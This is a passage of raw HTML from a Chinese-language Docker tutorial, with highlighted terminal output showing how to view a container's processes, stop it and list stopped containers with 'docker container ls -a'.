class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">tid</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">139734285989760</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">AH00489</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Apache</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2.4.33</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Unix</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">configured</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">resuming </span><span class=\"crayon-e\">normal </span><span class=\"crayon-i\">operations</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe16359d471344776-5\"><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">Thu </span><span class=\"crayon-i\">May</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">31</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">07.305153</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">core</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">notice</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">tid</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">139734285989760</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">AH00094</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Command </span><span class=\"crayon-v\">line</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'httpd -D FOREGROUND'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe16359d471344776-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0029 seconds] -->\r\n<p>这里我使用了容器名称作为参数。你可以看到在我们的 httpd 容器中与 Apache 相关的历史纪录。</p>\n<h3 id=\"toc_4\">如何确定 Docker 容器的进程？</h3>\n<p>容器是一个使用宿主资源来运行的进程。这样，你可以在宿主系统的进程表中定位容器的进程。让我们在宿主系统上确定容器进程。</p>\n<p>Docker 使用著名的 <code>top</code> 命令作为子命令的名称，来查看容器产生的进程。它采用容器的名称或 ID 作为参数。在旧版本的 Docker 中，只可运行 <code>docker top</code> 命令。在新版本中，<code>docker top</code> 和 <code>docker container top</code> 命令都可以生效。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe1635a2904239383\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container top  cranky_cori\r\nUID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD\r\nroot                15702               15690               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\nbin                 15729               15702               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\nbin                 15730               15702               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\nbin                 15731               15702               0                   18:35               ?                   00:00:00            httpd -DFOREGROUND\r\n\r\nroot@kerneltalks # ps -ef |grep -i 15702\r\nroot     15702 15690  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nbin      15729 15702  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nbin      15730 15702  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nbin      15731 15702  0 18:35 ?        00:00:00 httpd -DFOREGROUND\r\nroot     15993 15957  0 18:59 pts/0    00:00:00 grep --color=auto -i 15702\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635a2904239383-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635a2904239383-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635a2904239383-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635a2904239383-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635a2904239383-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635a2904239383-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635a2904239383-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635a2904239383-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635a2904239383-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635a2904239383-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635a2904239383-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635a2904239383-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635a2904239383-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635a2904239383-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe1635a2904239383-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container top  cranky_cori</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635a2904239383-2\"><span class=\"crayon-e\">UID                 </span><span class=\"crayon-e\">PID                 </span><span class=\"crayon-i\">PPID</span><span class=\"crayon-h\">                </span><span class=\"crayon-i\">C</span><span class=\"crayon-h\">                   </span><span class=\"crayon-e\">STIME               </span><span class=\"crayon-e\">TTY                 </span><span class=\"crayon-e\">TIME                </span><span class=\"crayon-e\">CMD</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe1635a2904239383-3\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">15690</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\">               </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\">            </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635a2904239383-4\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">15729</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\">               </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\">            </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe1635a2904239383-5\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">15730</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\">               </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\">            </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635a2904239383-6\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">15731</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\">               </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\">            </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe1635a2904239383-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635a2904239383-8\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># ps -ef |grep -i 15702</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe1635a2904239383-9\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15690</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635a2904239383-10\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">15729</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe1635a2904239383-11\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">15730</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635a2904239383-12\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">15731</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe1635a2904239383-13\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">15993</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15957</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">59</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">color</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">auto</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15702</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635a2904239383-14\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0050 seconds] -->\r\n<p>在第一个输出中，列出了容器产生的进程的列表。它包含了所有细节，包括用户号uid、进程号pid，父进程号ppid、开始时间、命令，等等。这里所有的进程号你都可以在宿主的进程表里搜索到。这就是我们在第二个命令里做得。这证明了容器确实是宿主系统中的进程。</p>\n<h3 id=\"toc_5\">如何停止 Docker 容器？</h3>\n<p>只需要 <code>stop</code> 命令！同样，它采用容器名称或 ID 作为参数。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe1635aa543732975\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container stop cranky_cori\r\ncranky_cori\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635aa543732975-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635aa543732975-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635aa543732975-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe1635aa543732975-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container stop cranky_cori</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635aa543732975-2\"><span class=\"crayon-v\">cranky</span><span class=\"crayon-sy\">_</span>cori</div><div class=\"crayon-line\" id=\"crayon-5b623fe1635aa543732975-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3 id=\"toc_6\">如何列出停止的或不活动的 Docker 容器？</h3>\n<p>现在我们停止了我们的容器，这时如果我们使用 <code>ls</code> 命令，它将不会出现在列表中。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe1635ae833422672\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container ls\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635ae833422672-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635ae833422672-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635ae833422672-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe1635ae833422672-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635ae833422672-2\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND             </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS              </span><span class=\"crayon-e\">PORTS               </span><span class=\"crayon-i\">NAMES</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe1635ae833422672-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>所以，在这种情况下，如果想要查看停止的或不活动的容器，你需要在 <code>ls</code> 命令里同时使用 <code>-a</code> 参数。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe1635b1193616737\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container ls -a\r\nCONTAINER ID        IMAGE               COMMAND              CREATED             STATUS                     PORTS               NAMES\r\nc46f2e9e4690        httpd               \"httpd-foreground\"   33 minutes ago      Exited (0) 2 minutes ago                       cranky_cori\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635b1193616737-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635b1193616737-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1635b1193616737-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1635b1193616737-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe1635b1193616737-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls -a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635b1193616737-2\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND              </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS                     </span><span class=\"crayon-e\">PORTS               </span><span class=\"crayon-e\">NAMES</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe1635b1193616737-3\"><span class=\"crayon-e\">c46f2e9e4690        </span><span class=\"crayon-i\">httpd</span><span class=\"crayon-h\">               </span><span class=\"crayon-s\">\"httpd-foreground\"</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">33</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">minutes </span><span class=\"crayon-e\">ago      </span><span class=\"crayon-e\">Exited</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">minutes </span><span class=\"crayon-e\">ago                       </span><span class=\"crayon-v\">cranky</span><span class=\"crayon-sy\">_</span>cori</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1635b1193616737-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>有了 <code>-a</code> 